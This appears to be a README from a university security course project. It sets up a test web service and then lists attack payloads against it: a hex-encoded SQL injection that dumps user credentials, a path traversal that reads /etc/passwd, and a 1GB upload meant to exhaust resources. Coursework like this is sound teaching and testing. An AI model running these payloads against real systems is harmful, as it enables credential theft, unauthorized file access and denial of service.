# csci4271-proj2
Let url be the path to access 443

# Setting up the database
- Adding a user with hexmail = "1", hexpass = "2":
enter "<url>/init_client/31/32"
- Adding a rule
enter "<url>/post-rule/init/admin/1"

# Payload: Inject SQL to extract all user credentials
payload=$(echo "' UNION SELECT user, password FROM user_pw_table;--" | xxd -p)
enter "<url>/init_client/${payload}/31"

# Inject '../' into the file path parameter to read unauthorized files
payload=$(echo "../../etc/passwd" | xxd -p)
enter "<url>/get_rule/${payload}"

# Generate a large file (1GB) and upload it
dd if=/dev/zero of=largefile.txt bs=1M count=1024
curl -X POST -F "file=@largefile.txt" -k "<url>/post-rule/init/validsite/validuser"

